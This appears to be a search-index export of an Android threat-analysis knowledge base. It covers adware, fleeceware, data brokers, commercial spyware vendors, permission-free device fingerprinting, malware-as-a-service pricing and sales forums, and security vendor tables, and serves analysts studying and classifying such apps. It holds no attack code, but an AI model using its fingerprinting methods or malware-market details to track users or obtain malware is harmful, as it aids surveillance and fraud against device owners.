unlock or app switch Android 12+ overlay deprioritization Foreground service notifications Persistent notification used as ad surface under the guise of \"running service\" Android 14+ foreground service type declarations <p>HiddenAds campaigns changed their app icon to the Google Play icon and renamed themselves \"Google Play\" or \"Setting\" to hide from users while delivering persistent ads. Invisible Adware (2023, 43 apps, 2.5M downloads) loaded ads only when the device screen was off, waiting multiple weeks after installation before activating.</p>"},{"location":"grayware/#fleeceware","title":"Fleeceware","text":"<p>Apps that exploit free trial mechanics and subscription billing to charge excessive fees for minimal functionality.</p>"},{"location":"grayware/#pattern","title":"Pattern","text":"<ol> <li>Offer a \"free trial\" (typically 3 days) requiring payment method entry</li> <li>Auto-renew at $30-$200/week for commodity functionality (flashlight, QR scanner, wallpaper, horoscope)</li> <li>Make cancellation deliberately confusing: uninstalling the app does not cancel the subscription</li> <li>Target users unfamiliar with app store subscription management</li> <li>Use misleading UI that obscures the subscription cost or implies the trial is truly free</li> </ol>"},{"location":"grayware/#scale","title":"Scale","text":"<p>Avast identified 200+ fleeceware apps with 1B+ combined downloads in 2020. Sophos coined the term \"fleeceware\" in 2019 after finding apps charging $100+/month for basic calculator and QR scanner functionality. Apple and Google have both tightened trial disclosure requirements in response, but enforcement remains inconsistent.</p>"},{"location":"grayware/#technical-indicators_1","title":"Technical Indicators","text":"<ul> <li>Short trial period (1-3 days) followed by high weekly/monthly charge</li> <li>Minimal app functionality relative to subscription cost</li> <li>Subscription initiation flow that obscures pricing</li> <li>In-app purchase / subscription APIs invoked immediately during onboarding</li> <li>No meaningful feature gating between free and paid tiers</li> </ul>"},{"location":"grayware/#riskware-dual-use-apps","title":"Riskware / Dual-Use Apps","text":"<p>Legitimate apps with capabilities that can be -- or have been -- repurposed for surveillance, data harvesting, or abuse.</p>"},{"location":"grayware/#documented-cases_2","title":"Documented Cases","text":"<p>VPN apps selling browsing data: Sensor Tower, an analytics company, operated at least 20 VPN and ad-blocker apps (including Luna VPN and AdBlock Focus) to collect app usage data from millions of users. The apps required root certificate installation, giving Sensor Tower visibility into all network traffic. BuzzFeed News exposed this in 2020.</p> <p>Keyboard apps exfiltrating keystrokes: ai.type, a popular custom keyboard with 40M+ downloads, was found sending keystroke data including passwords to remote servers. A 2017 breach of ai.type's unprotected database exposed personal data of 31M users including phone numbers, device details, and typing patterns.</p> <p>File manager apps harvesting data: Several Chinese-developed file manager apps on Google Play (File Manager by sharkApp, File Recovery &amp; Data Recovery) were found by Pradeo exfiltrating contacts, device location, photos, audio, and network information to servers in China despite claiming no data collection in their Play Store listings.</p> <p>Free antivirus as data collection: DU Antivirus (by Baidu spin-off DU Group) collected device data, installed app lists, and call logs, then sold aggregated data. 10M+ installs before removal. Multiple free AV apps on Play Store operate primarily as data collection platforms with minimal actual detection capability.</p> <p>Utility apps with unnecessary permissions: Flashlight apps requesting camera, microphone, contacts, and location permissions. The permissions serve no function within the app's stated purpose but enable data harvesting.</p>"},{"location":"grayware/#commercial-surveillance-vendor-market","title":"Commercial Surveillance Vendor Market","text":"<p>Commercial spyware sold to governments occupies the extreme end of the grayware spectrum: technically legal under the laws of the selling country, marketed as law enforcement tools, but routinely deployed against journalists, dissidents, and opposition politicians. These vendors' Android implants are the most sophisticated malware in the wild.</p>"},{"location":"grayware/#vendors-and-pricing","title":"Vendors and Pricing","text":"Vendor Product Pricing Status Source NSO Group (Israel) Pegasus $500K setup + $650K per 10 targets; Ghana deployment: $8M US Entity List (Nov 2021) Commerce Dept. Intellexa/Cytrox Predator EUR 8-13.6M per deployment US Entity List (Jul 2023), Treasury sanctions (Mar + Sep 2024) Treasury Candiru (Israel) DevilsTongue Unknown US Entity List (Nov 2021) Kaspersky QuaDream (Israel) REIGN Unknown Shut down Apr 2023 after Citizen Lab/Microsoft exposure Citizen Lab Paragon (Israel) Graphite Unknown Active; severed Italian government contract after exposure Citizen Lab Variston IT (Spain) Heliconia Unknown Exposed by Google TAG Nov 2022 Chrome, Firefox, Windows Defender exploits RCS Lab (Italy) Hermit Unknown Active Lookout <p>Sales are typically limited to a single phone country code prefix, with additional countries available for extra fees. Annual maintenance runs 17-22% of the system cost.</p>"},{"location":"grayware/#international-response","title":"International Response","text":"<p>The Pall Mall Process (February 2024): 35 nations convened at Lancaster House, London, establishing guiding principles on commercial spyware. A Code of Practice was agreed in April 2025. US Entity List additions have had limited practical impact -- Intellexa continued operations despite sanctions. Paragon's January 2025 WhatsApp zero-click campaign targeting ~90 accounts (including journalists) occurred while the company was ostensibly \"responsible\" under its own ethical framework.</p>"},{"location":"grayware/#data-broker-industry-economics","title":"Data Broker Industry Economics","text":""},{"location":"grayware/#market-size","title":"Market Size","text":"<p>The global data broker market was estimated at USD 278 billion in 2024, projected to reach USD 512 billion by 2033 at 7.3% CAGR. North America holds 41.2% revenue share. Mobile apps and SDKs account for 35.74% of data acquisition. An estimated 5,000 data brokers operate globally.</p>"},{"location":"grayware/#the-supply-chain","title":"The Supply Chain","text":"<pre><code>App SDK \u2192 Aggregator \u2192 Data Broker \u2192 Buyer\n(device)   (Gravy)     (Venntel)    (gov, advertiser, hedge fund)\n</code></pre> <p>Per-device revenue for app developers: $0.01-$0.05 per device per month for location data. The average cost of an individual data profile (ages 18-25): $0.36. Fog Data Science law enforcement subscriptions start under $10,000 -- making mass surveillance accessible to local police.</p>"},{"location":"grayware/#major-consolidation-events","title":"Major Consolidation Events","text":"<p>Oracle's data broker empire (built 2014-2018, collapsed 2024): Oracle acquired BlueKai (~$400M, 2014), Datalogix (~$1.2B, 2014), and AddThis for web tracking. Combined Oracle Advertising revenue peaked at $2B (2022). GDPR enforcement destroyed the model -- BlueKai lost 85% of European revenue overnight. Facebook pulled its third-party data marketplace. Oracle exited advertising entirely as of October 2024, revenue having fallen to $300M.</p> <p>Foursquare acquired Placed (attribution) and Factual (location data), consolidating location intelligence under one roof.</p> <p>The Gravy Analytics hack (January 2025) exposed the fragility of the entire ecosystem: a single compromised key to an Amazon cloud environment potentially exposed 17 terabytes of location data including coordinates at the White House, the Kremlin, Vatican City, and military bases worldwide.</p>"},{"location":"grayware/#device-fingerprinting-without-permissions","title":"Device Fingerprinting Without Permissions","text":"<p>Tracking techniques that require no Android permissions, operating entirely below the permission model.</p>"},{"location":"grayware/#canvas-fingerprinting","title":"Canvas Fingerprinting","text":"<p>A WebView renders a hidden image using the HTML5 Canvas API. The rendering varies subtly based on GPU, graphics driver, font rendering engine, and sub-pixel antialiasing. The pixel data is hashed to produce a device fingerprint. No permission required. Works in any WebView or browser.</p>"},{"location":"grayware/#audio-fingerprinting-audiocontext-api","title":"Audio Fingerprinting (AudioContext API)","text":"<p>The Web Audio API generates and processes a low-frequency audio signal entirely within the browser -- no speakers used, no microphone accessed. The resulting waveform reflects the device's audio hardware and driver stack, producing a stable identifier across sessions. Safari 17+ injects randomness in Private mode; most other browsers remain unprotected.</p>"},{"location":"grayware/#ultrasonic-cross-device-tracking","title":"Ultrasonic Cross-Device Tracking","text":"<p>SilverPush (exposed 2016): Apps embedded the SilverPush SDK, which used the device microphone to listen for ultrasonic audio beacons (inaudible to humans) embedded in TV commercials, radio broadcasts, or web content. When a beacon was detected, the SDK linked the user's mobile device to the content they were exposed to, enabling cross-device tracking without any network-level correlation. The FTC issued warning letters to 12 app developers in March 2016. Security researchers demonstrated that ultrasonic tracking-enabled apps could deanonymize Tor users by correlating beacons with browsing sessions. SilverPush shut down the Unique Audio Beacon service after FTC pressure.</p>"},{"location":"grayware/#android-advertising-id-gaid","title":"Android Advertising ID (GAID)","text":"<p>The Google Advertising ID (GAID) is a user-resettable identifier on every Android device with Google Play Services. It is transmitted in every RTB bid request. Resetting creates a new ID but does not stop tracking -- many SDKs collect Android ID, IMEI (pre-Android 10), and hardware identifiers alongside GAID, enabling re-linking after resets.</p> <p>Google's Privacy Sandbox for Android (announced 2022) introduces Topics API (replacing the abandoned FLoC), Protected Audiences (on-device retargeting), Attribution Reporting API, and SDK Runtime (isolated sandbox for ad SDKs). GAID deprecation timeline remains uncertain. Google committed to supporting it for at least two years during transition.</p>"},{"location":"grayware/#battery-status-api-historical","title":"Battery Status API (Historical)","text":"<p>Research by Olejnik et al. (2015) demonstrated that the HTML5 Battery Status API, which reported battery level with double-precision floating point (e.g., <code>0.9301929625425652</code>), could fingerprint devices without any permission. Firefox on Linux was particularly vulnerable. Mozilla removed the Battery Status API from Firefox 52 (March 2017).</p>"},{"location":"grayware/#analysis-approach","title":"Analysis Approach","text":"<p>When investigating a sample flagged as PUP, riskware, or suspected grayware:</p>"},{"location":"grayware/#permission-audit","title":"Permission Audit","text":"<p>Compare the app's requested permissions against its stated functionality. A weather app requesting READ_CONTACTS and READ_SMS is a red flag. Use the permissions section for detailed analysis of each permission's abuse potential.</p>"},{"location":"grayware/#network-traffic-analysis","title":"Network Traffic Analysis","text":"<p>Intercept outbound connections and look for:</p> Signal Indicates Connections to known data broker domains SDK-based data harvesting Large POST requests containing device/user data Data exfiltration Periodic beaconing with device identifiers Tracking SDK activity Connections to ad networks without visible ads Ad fraud TLS certificate pinning on non-app-core endpoints Attempt to hide SDK traffic from analysis"},{"location":"grayware/#sdk-identification_1","title":"SDK Identification","text":"<p>After decompilation, check for embedded third-party SDKs:</p> Check Method Package names Search for known broker SDK package prefixes in smali/classes Manifest components Services and receivers not attributable to the app's core function String constants API keys, SDK version strings, initialization tokens Network endpoints Hardcoded URLs pointing to broker/analytics infrastructure Gradle dependencies <code>build.gradle</code> references to SDK artifacts (if source available)"},{"location":"grayware/#data-flow-tracking","title":"Data Flow Tracking","text":"<p>Trace how permission-protected data moves from acquisition to network transmission:</p> <ol> <li>Identify all <code>ContentResolver.query()</code> calls for contacts, SMS, call log</li> <li>Follow data through local processing and serialization</li> <li>Identify the network call that transmits the data</li> <li>Determine destination: is it the app's own backend or a third-party SDK endpoint?</li> </ol>"},{"location":"grayware/#known-data-broker-domains","title":"Known Data Broker Domains","text":"<p>Domains associated with data harvesting SDKs, useful for network traffic filtering during analysis.</p> Domain Pattern Associated Entity Data Type <code>*.xmode.io</code> X-Mode / Outlogic Location <code>*.huq.io</code> Huq Industries Location, footfall <code>*.cuebiq.com</code> Cuebiq Location <code>*.safegraph.com</code> SafeGraph Location, foot traffic <code>*.predic.io</code> Predicio Location <code>*.tutela.com</code> Tutela Network quality + location <code>*.measurementsys.com</code> Measurement Systems Location, PII, device data <code>*.placed.com</code> Foursquare (Placed) Location attribution <code>*.kochava.com</code> Kochava Attribution, device data <code>*.mxplay.com</code> MX Player analytics Usage, device data <code>*.gravityinsights.com</code> Gravy Analytics Location <p>This list is not exhaustive. New SDKs and broker domains emerge continuously. Cross-reference with AppCensus, Exodus Privacy, and IDAC research for updated indicators.</p>"},{"location":"grayware/#legal-gray-area","title":"Legal Gray Area","text":"<p>Understanding the legal context matters for analysts because it determines how to classify and report findings.</p>"},{"location":"grayware/#enforcement-actions","title":"Enforcement Actions","text":"<p>FTC vs. SpyFone (2021): FTC banned SpyFone and its CEO from the surveillance business, ordered deletion of all collected data. First FTC action banning a company from the stalkerware industry entirely.</p> <p>FTC vs. X-Mode / Outlogic (2024): FTC banned X-Mode from selling sensitive location data (near medical facilities, religious organizations, domestic violence shelters) and required deletion of previously collected data.</p> <p>FTC vs. InMarket (2024): FTC settled with data broker InMarket over selling precise geolocation data without informed consent.</p> <p>FTC vs. Avast (2024): FTC fined Avast $16.5M for selling browsing data collected through its antivirus products and browser extensions via subsidiary Jumpshot.</p>"},{"location":"grayware/#google-play-policy-evolution","title":"Google Play Policy Evolution","text":"<p>Google has progressively restricted data harvesting through Play Store policy changes:</p> <ul> <li>2021: Banned X-Mode and similar location SDKs, required disclosure of all SDKs</li> <li>2022: Banned stalkerware distribution, restricted <code>QUERY_ALL_PACKAGES</code> usage</li> <li>2023: Expanded data safety section requirements, restricted background location access</li> <li>2024: Further SDK transparency requirements, restricted accessibility service use for non-accessibility purposes</li> </ul>"},{"location":"grayware/#why-this-matters-for-analysts","title":"Why This Matters for Analysts","text":"<p>When a client sends a sample and asks \"is this malware?\", the answer for grayware requires context beyond technical analysis. An app collecting location data and selling it to brokers is legal in many jurisdictions if disclosed in the privacy policy, regardless of whether users actually read it. The same app collecting the same data and selling it to a military contractor may trigger different legal frameworks. An analyst's job is to document what the app does technically and let the legal and compliance teams determine the classification. The categories on this page help frame the conversation.</p>"},{"location":"industry/","title":"Mobile Security Industry","text":"<p>The companies and organizations involved in Android security, from threat intelligence firms naming malware families to forensics companies extracting device data to the modding scene distributing repackaged APKs.</p> Page Content Security Companies Threat intel, endpoint security, app testing, AV engines, offensive research, forensics, packer vendors, third-party stores, modding scene"},{"location":"industry/#industry-structure","title":"Industry Structure","text":"<p>The mobile threat landscape is split across several roles that rarely overlap.</p> <p>Discovery. The initial sample surfaces through one of a few paths: a honeypot or crawler at a threat intel firm (ThreatFabric, Cleafy, Cyble), a Play Store audit by a vendor with scanner partnerships (Dr.Web, Kaspersky, ESET), a VirusTotal retrohunt, or a user complaint escalated through an AV vendor's telemetry pipeline. Academic groups and CERTs occasionally contribute first sightings, but rarely for banking trojans.</p> <p>Naming. Whoever publishes first picks the name. ThreatFabric named Cerberus, Alien, Ermac, Hook, and Octo. Cleafy named Copybara, BingoMod, and ToxicPanda. Kaspersky and ESET tend to publish under their own internal naming schemes, creating parallel nomenclatures. There is no central naming authority. The result is alias sprawl: Octo is also known as ExobotCompact, Coper is the same lineage as Octo v1, and Anatsa overlaps with TeaBot.</p> <p>Detection. AV engines on VirusTotal each assign their own signature strings. Google Play Protect runs its own classifier. None of these align with the research-community names. An analyst looking at a sample may see <code>Trojan-Banker.AndroidOS.Ermac</code> from Kaspersky, <code>Android/Spy.Cerberus</code> from ESET, and <code>Artemis!{hash}</code> from McAfee, all for the same APK.</p> <p>Response. Takedowns are rare for Android malware. Law enforcement has only intervened in a handful of cases (see key events below). Most \"response\" is Google pulling apps from the Play Store after a vendor publishes, sometimes weeks or months after initial discovery.</p>"},{"location":"industry/#how-malware-gets-named","title":"How Malware Gets Named","text":"<p>The naming lifecycle works roughly as follows:</p> <ol> <li>Sample acquisition. A researcher obtains an APK through a dropper on Play Store, a phishing SMS campaign, a C2 panel crawl, or VirusTotal hunting rules (YARA/VT Intelligence).</li> <li>Triage and clustering. The sample is decompiled, and its code structure, C2 protocol, overlay injection pattern, and string artifacts are compared against known families. If it does not match, it is a candidate for a new family name.</li> <li>Naming and publication. The discovering firm publishes a blog post with the chosen name, IOCs (hashes, C2 domains), and a technical breakdown. This becomes the de facto name.</li> <li>VirusTotal propagation. Other engines gradually pick up the sample. Each assigns its own detection label. There is no standard mapping.</li> <li>Cross-vendor drift. Over time, forks and rebrands compound the confusion. Cerberus source leaked and spawned Alien, which spawned Ermac, which spawned Hook. Each got a separate name despite sharing large portions of code. Malpedia and ThreatFabric's threat tracker are the closest things to a canonical mapping, but neither is exhaustive.</li> </ol>"},{"location":"industry/#maas-economy","title":"MaaS Economy","text":"<p>Most active Android banking trojans operate as Malware-as-a-Service. The operator (threat actor deploying the malware against victims) rents access from the developer (threat actor who wrote and maintains the bot). This is a subscription business.</p>"},{"location":"industry/#whats-sold","title":"What's Sold","text":"<p>A standard MaaS package includes:</p> <ul> <li>Admin panel. Web-based C2 dashboard for managing bots, pushing commands, configuring inject targets, and viewing stolen credentials.</li> <li>Inject kit. A library of HTML overlay pages that mimic banking apps. Sold per-region or as a full global set. Some sellers offer custom inject creation as an upsell.</li> <li>Builder / APK generator. Allows the operator to produce new APK variants with unique signing keys, package names, and obfuscation profiles.</li> <li>Support channel. Private Telegram group or forum thread where the developer provides updates, troubleshooting, and feature announcements.</li> <li>Updates. Ongoing patches for detection evasion, new Android version compatibility, and feature additions (VNC, keylogging, SMS forwarding, push notification interception).</li> </ul>"},{"location":"industry/#pricing","title":"Pricing","text":"<p>Prices are quoted from underground advertisements and open-source reporting. Monthly rental is the standard model, though some offer lifetime or per-build pricing.</p> Family Price Notes Cerberus $4,000/month Sold 2019-2020, source code auctioned then leaked free in Sept 2020 Hook $7,000/month Premium tier, VNC and RAT capabilities, advertised by DukeEugene Ermac $3,000/month Same developer lineage as Cerberus/Alien, sold on darknet forums Octo $2,000/month Also sold as Octo2 with upgraded C2 encryption, DGA BTMOB $5,000-$10,000 Higher price point, newer entrant Albiriox $650-$720/month Budget tier, lower feature set <p>Price correlates loosely with feature maturity, evasion quality, and the developer's reputation. Leaks and law enforcement actions crash prices overnight. After the Cerberus source leak, the entire market adjusted downward temporarily because operators could fork Cerberus for free.</p>"},{"location":"industry/#distribution-channels","title":"Distribution Channels","text":"<p>MaaS listings and operator coordination happen on:</p> <ul> <li>Telegram channels. Primary distribution vector since 2020. Developers run private channels for customer support and public channels for advertisements. Some families (Hook, Ermac) were advertised almost exclusively through Telegram.</li> <li>XSS Forum. Russian-language cybercrime forum. Long-running threads for Cerberus, Ermac, and Octo sales. Requires vetting for membership.</li> <li>Exploit.in. Another Russian-language forum with active Android malware vendor sections.</li> <li>Breached.to (formerly RaidForums successor). English-language forum where leaked source code and cracked panels surface. Lower operational security, more likely to attract less sophisticated operators.</li> </ul> <p>Inject kits circulate separately from the bot itself. A thriving secondary market exists for regional overlay packs targeting specific banks, crypto exchanges, and payment apps.</p>"},{"location":"industry/#key-industry-events","title":"Key Industry Events","text":"<p>A short list of events that materially changed the Android threat landscape.</p> <p>Cerberus source leak (September 2020). After failing to auction the Cerberus source code, the developer released it for free on underground forums. This single event seeded multiple successor families: Alien, Ermac, and eventually Hook. It lowered the barrier to entry for new operators and flooded the ecosystem with Cerberus-derived variants that persist today.</p> <p>FluBot takedown by Europol (June 2022). Europol's Dutch-led operation seized FluBot's infrastructure across 11 countries. One of the few successful law enforcement actions against a mobile malware operation. FluBot had been one of the most aggressive SMS-worm-style Android threats in Europe. The takedown was effective: FluBot did not resurface.</p> <p>FinFisher bankruptcy (2022). FinFisher GmbH, developer of the FinSpy commercial spyware suite, filed for insolvency after years of legal pressure and investigations into sales to authoritarian regimes. Signaled that commercial spyware vendors face real legal risk, at least in EU jurisdictions.</p> <p>Intellexa sanctions (March 2024). The US Treasury sanctioned Intellexa Consortium entities and individuals behind the Predator spyware. First financial sanctions specifically targeting a commercial spyware vendor. Intellexa's operations fragmented but did not fully cease, with infrastructure rotating through new hosting providers.</p>"},{"location":"industry/security-companies/","title":"Mobile Security Industry","text":"<p>The mobile security industry has distinct segments. Understanding who operates where helps when reading reports, evaluating tools, and recognizing whose perspective shapes the research.</p>"},{"location":"industry/security-companies/#threat-intelligence-malware-research","title":"Threat Intelligence / Malware Research","text":"<p>Companies that discover, analyze, and name mobile malware families. Their reports are primary sources.</p> Company Focus Notable For Avast Threat Labs Consumer + research Avast Decoded blog. Android adware, Play Store threats, Cerberus analysis. CheckPoint Research Broad security research CPR publishes Android malware campaigns, Play Store threat analysis. Rafel RAT discovery (120+ campaigns). FluHorse (Flutter-based stealer). Cisco Talos Broad threat intelligence Gustuff analysis. Predator deep-dive (Python implant architecture). Citizen Lab Digital surveillance research University of Toronto. Pegasus, Predator, FinSpy tracking. Cleafy Financial fraud, mobile banking Detailed banking trojan reports. Copybara, Anatsa, BRATA, ToxicPanda, SharkBot, PixPirate, BingoMod, Klopatra, Albiriox. CYFIRMA External threat landscape management FireScam discovery (fake RuStore/Telegram Premium info-stealer). Cyble Dark web intelligence + mobile CRIL (Cyble Research and Intelligence Labs). Chameleon, GodFather v2, TsarBot, Antidot, TrickMo, Gigabud, BTMOB RAT, DeVixor. ESET Broad antivirus + research Regular Android publications. FinSpy devirtualization. NGate NFC relay discovery. FurBall, SpyAgent. Fortinet FortiGuard Labs Broad threat intelligence Android malware write-ups, BankBot analysis. Google TAG State-sponsored threat tracking Tracks commercial spyware. Predator exploit chains, Hermit analysis. Group-IB Threat intelligence, fraud prevention GodFather, Gustuff discovery. APT-level mobile tracking. HUMAN Security (Satori) Bot/fraud intelligence Harly analysis. Mobile fraud research. IBM Security Trusteer Financial fraud PixPirate analysis. Banking fraud intelligence. Kaspersky Broad threat intelligence Long Android malware history. Triada, Harly, BRATA, Roaming Mantis, LightSpy (initial iOS disclosure). Lookout Mobile-focused threat intel Pegasus (Chrysaor), Hermit discovery. KoSpy DPRK spyware, GuardZoo Houthi surveillance. BoneSpy/PlainGnome Sandcat spyware. EagleMsgSpy Chinese lawful intercept. LightSpy (DragonEgg attribution). DCHSpy MuddyWater Iranian surveillanceware. McAfee Mobile Research Mobile malware, adware, PUPs Part of McAfee Labs. Primary tracker of MoqHao/Roaming Mantis. Original discovery of SpyAgent OCR crypto theft, Goldoson SDK supply chain, Xamalicious Xamarin backdoor, .NET MAUI evasion. Deep Korean and Indian market coverage. HiddenAds, Clicker, and Invisible Adware at-scale ad fraud discovery. SpyLoan global tracking. Sun Team DPRK attribution. NCC Group / Fox-IT Offensive security + research SharkBot, Ermac/Hook lineage analysis. FluBot DGA research. PRODAFT Threat intelligence FluBot infrastructure analysis. Underground forum monitoring. Proofpoint Email/messaging threats TangleBot (Medusa) naming. Mobile phishing campaigns. Sophos Cross-platform threats X-Ops team publishes Android malware analysis. FluBot, PJobRAT Taiwan campaign. ThreatFabric Android banking trojans Most prolific Android malware research. Named Cerberus, Anatsa, Hook, Ermac, Xenomorph, Medusa, Vultur, Octo, Alien, Brokewell, Crocodilus, Herodotus, Sturnus, RatOn. LightSpy DragonEgg-to-LightSpy link. Trend Micro Enterprise threats TgToxic discovery. Mobile ransomware, spyware. Zimperium Mobile threat defense GriftHorse discovery. Hook v3, GodFather v3 analysis. Gigabud+SpyNote infrastructure mapping. zLabs research. Zscaler ThreatLabz Cloud security + research Copybara MQTT analysis, Anatsa Play Store campaigns."},{"location":"industry/security-companies/#threat-intel-vendor-comparison","title":"Threat Intel Vendor Comparison","text":"<p>Which vendor to reference depends on what you need. This matrix ranks the major Android malware research publishers.</p> Vendor Named Families Blog Frequency Primary Focus Free Intel ThreatFabric 30+ Weekly Banking trojans, MaaS Blog posts, IOCs Cleafy 15+ Bi-weekly Banking fraud, ATS Blog posts Kaspersky 20+ Weekly Broad (banking, spyware, adware) Securelist blog, quarterly stats ESET 15+ Bi-weekly Broad (regional focus) WeLiveSecurity blog Cyble 15+ Weekly Dark web + mobile CRIL blog Lookout 10+ Monthly Spyware, state-sponsored Blog posts Zimperium 10+ Monthly Banking trojans, enterprise zLabs blog, annual report Check Point 10+ Bi-weekly Broad campaigns CPR blog Google TAG 5+ Quarterly State-sponsored, 0-days Blog posts <p>ThreatFabric is the most prolific for Android banking trojans specifically. Cleafy provides the deepest technical analysis of ATS/on-device fraud. Kaspersky has the broadest coverage. Lookout leads in commercial spyware tracking.</p>"},{"location":"industry/security-companies/#mobile-endpoint-security","title":"Mobile Endpoint Security","text":"<p>Detection and prevention products running on devices or managing device fleets.</p> Company Product Type Notes CrowdStrike EDR with mobile Falcon for Mobile. Extends endpoint detection to Android/iOS. Lookout Mobile endpoint security Enterprise MDM + threat detection. Acquired by F5. Microsoft Defender Cross-platform Defender for Endpoint includes Android device management. Pradeo Mobile fleet security App analysis and device protection. Samsung Knox Platform security Hardware-backed isolation. Enterprise security platform. Zimperium Mobile threat defense (MTD) On-device ML detection. zIPS for enterprise. z9 engine."},{"location":"industry/security-companies/#app-security-testing-sastdast","title":"App Security Testing (SAST/DAST)","text":"<p>Finding vulnerabilities in Android apps.</p> Company Focus Notes Guardsquare Protection (DexGuard) + testing (AppSweep) Both sides: packer vendor and security testing. Contributes to ProGuard/R8. Acquired Verimatrix XTD in Feb 2026 for $8.5M -- now controls DexGuard, ProGuard, and Verimatrix XTD. NowSecure Mobile app security testing Automated SAST/DAST. OWASP MASVS testing. Blog covers practical mobile security. Oversecured Automated Android/iOS vuln scanning Founded by Sergey Toshin. 225+ Google app vulnerabilities. Top blog in the space. Promon App shielding (RASP) Runtime protection. Discovered StrandHogg (task affinity attack). Quixxi App security Mobile app security platform, vulnerability scanning."},{"location":"industry/security-companies/#av-engines-android-detection","title":"AV Engines (Android Detection)","text":"<p>Their detection names appear in VirusTotal. For detailed detection name formats and cross-vendor mapping, see Naming Conventions.</p>"},{"location":"industry/security-companies/#primary-engines-best-android-coverage","title":"Primary Engines (Best Android Coverage)","text":"Engine Detection Name Format Notes Avast/AVG <code>Android:Family-X [Trj]</code> Same engine (Avast acquired AVG). Strong mobile. Bitdefender <code>Android.Trojan.Banker.XX</code> Licensed by eScan, GData, Emsisoft, VIPRE, Arcabit. DrWeb <code>Android.BankBot.NNNNN</code> Numeric IDs. Popular in CIS countries. Good mobile coverage. ESET-NOD32 <code>Android/Spy.Banker.XXX</code> Consistent naming. Research-backed signatures. Fortinet <code>Android/Family.A!tr</code> Good mobile coverage, suffix indicates type. Kaspersky <code>HEUR:Trojan-Banker.AndroidOS.Family.x</code> Best Android heuristic detection. Prefixes: HEUR, UDS, PDM. McAfee <code>Android/Family.X</code> or <code>Artemis!HASH</code> \"Artemis\" = generic cloud ML detection. Microsoft <code>Trojan:AndroidOS/Family.A!MTB</code> Growing Android coverage. Sophos <code>Andr/Family-X</code> Consistent <code>Andr/</code> prefix. Symantec/Broadcom <code>Trojan.Gen.MBT</code> Often generic, poor family attribution. Trend Micro <code>AndroidOS_Family.VARIANT</code> Enterprise-focused."},{"location":"industry/security-companies/#mobile-specific-engines","title":"Mobile-Specific Engines","text":"Engine Notes AhnLab-V3 Korean. <code>Trojan/Android.Banker.NNNNNN</code>. Strong on Asian malware. Avast-Mobile Mobile-dedicated scanner. BitDefenderFalx Bitdefender's mobile engine. Symantec Mobile Insight Broadcom's mobile engine. Often generic verdicts. Trustlook Mobile-focused behavioral detection."},{"location":"industry/security-companies/#edr-next-gen-limited-family-attribution","title":"EDR / Next-Gen (Limited Family Attribution)","text":"Engine Notes CrowdStrike Falcon Behavioral, often no family name. DeepInstinct Binary ML verdict only. Palo Alto Networks ML-based, usually no family name. SentinelOne (Static ML) Binary verdict: \"Static AI - Malicious APK\". Elastic Community rules."},{"location":"industry/security-companies/#regional-engines","title":"Regional Engines","text":"Engine Region Notes Alibaba / AliCloud China <code>TrojanBanker:Android/Family.HASH</code> Antiy-AVL China <code>Trojan/Android.Banker.family</code> Baidu China <code>Android.Trojan.Bank.XX</code> Huorong China Endpoint security. Jiangmin China <code>TrojanBanker.AndroidOS.xx</code> Kingsoft China <code>Android.Troj.Family.x</code> Rising China <code>Trojan.Banker/Android!version</code> Tencent China <code>A.privacy.family.x</code> ALYac Korea Uses Bitdefender engine. TACHYON Korea <code>Trojan-Android/Family</code> ViRobot Korea <code>Android.Family.X</code> Bkav Pro Vietnam Limited mobile coverage. K7AntiVirus / K7GW India Numeric hash-based names. QuickHeal India <code>Android.Family.GEN</code> Ikarus Austria <code>Trojan-Banker.AndroidOS.Family</code>. Zillya Ukraine <code>Trojan.Banker.Android.NNNNN</code> Yandex Russia <code>Trojan.AndroidOS.Family</code>"},{"location":"industry/security-companies/#offensive-security-research","title":"Offensive Security / Research","text":"<p>Organizations doing Android security research from an offensive or research perspective.</p> Company Focus Notes 8kSec Mobile security training + research Battlegrounds CTF platform. Blog covers app and kernel Android security. Google Android Red Team Internal offensive security androidoffsec.withgoogle.com. Kernel exploitation, fuzzing. Google Project Zero 0-day research Top-tier exploit chain research. Android kernel, Binder, codecs. Trellix (formerly FireEye Mobile) Advanced threat research Mobile APT tracking, nation-state campaigns. WithSecure (F-Secure) Pentesting tools Maintains Drozer (Android assessment tool)."},{"location":"industry/security-companies/#digital-forensics","title":"Digital Forensics","text":"<p>Mobile forensics tools used by law enforcement, incident response, and intelligence.</p> Company Product Notes Cellebrite UFED, Physical Analyzer Market leader in mobile forensics. Physical extraction, app data parsing. Grayshift GrayKey iPhone and Android device unlocking. Law enforcement focused. Magnet Forensics AXIOM Cross-platform digital forensics including mobile. Acquired by Thoma Bravo. MOBILedit Forensic Express Mobile phone examination and data extraction. MSAB XRY Swedish mobile forensics. Logical and physical extraction. Oxygen Forensics Detective Cloud data extraction, mobile device forensics."},{"location":"industry/security-companies/#packer-protection-vendors","title":"Packer / Protection Vendors","text":"<p>Companies selling Android app protection. Documented in Packers.</p> Company Product Origin Baidu Baidu Reinforcement China Bangcle SecNeo China Digital.ai (formerly Arxan) App Protection USA Guardsquare DexGuard Belgium iJiami iJiami China Licel DexProtector Netherlands Nagain / APKProtect APKProtect China NetEase NeteaseYiDun China Promon Promon SHIELD Norway Qihoo 360 360 Jiagu China SenseShield Virbox Protector China Tencent Legu China INKA Entworks AppSealing South Korea Lockin Company LIAPP South Korea Appdome Inc Appdome USA/Israel Zimperium zShield USA Verimatrix (now Guardsquare) Verimatrix XTD France"},{"location":"industry/security-companies/#app-distribution-third-party-stores","title":"App Distribution / Third-Party Stores","text":"<p>Alternative distribution channels outside Google Play. Relevant because malware distribution increasingly uses these channels and sideloading.</p> Store/Platform Region Notes 360 Mobile Assistant China Qihoo 360's store. Amazon Appstore Global Ships with Fire devices. Available on standard Android. APKMirror Global APK hosting. More curated than APKPure. Focused on original developer uploads. Apkada Russia/CIS Russian-language store. APKPure Global APK download site. Users sideload from here. Itself was compromised with malware in 2021. Aptoide Global Third-party marketplace. Community-driven. Used by legitimate apps and malware alike. Baidu Mobile Assistant China Baidu's app store. CafeBazaar Iran Dominant Iranian Android store. 40M+ users. Google Play Global Official store. Play Protect scanning. Droppers still get through regularly. Huawei AppGallery Global (Huawei devices) Second-largest Android store. Own review process. Used for regional malware distribution. OPPO App Market China/Global Pre-installed on OPPO/OnePlus. Samsung Galaxy Store Global (Samsung devices) Samsung's store. Less strict review than Play Store historically. Tencent MyApp (Yingyongbao) China Major Chinese Android store. Vivo App Store China/Global Pre-installed on Vivo devices. Xiaomi GetApps China/Global Pre-installed on Xiaomi devices. <p>In China, Google Play is unavailable. Users install apps from OEM stores (Tencent, Baidu, 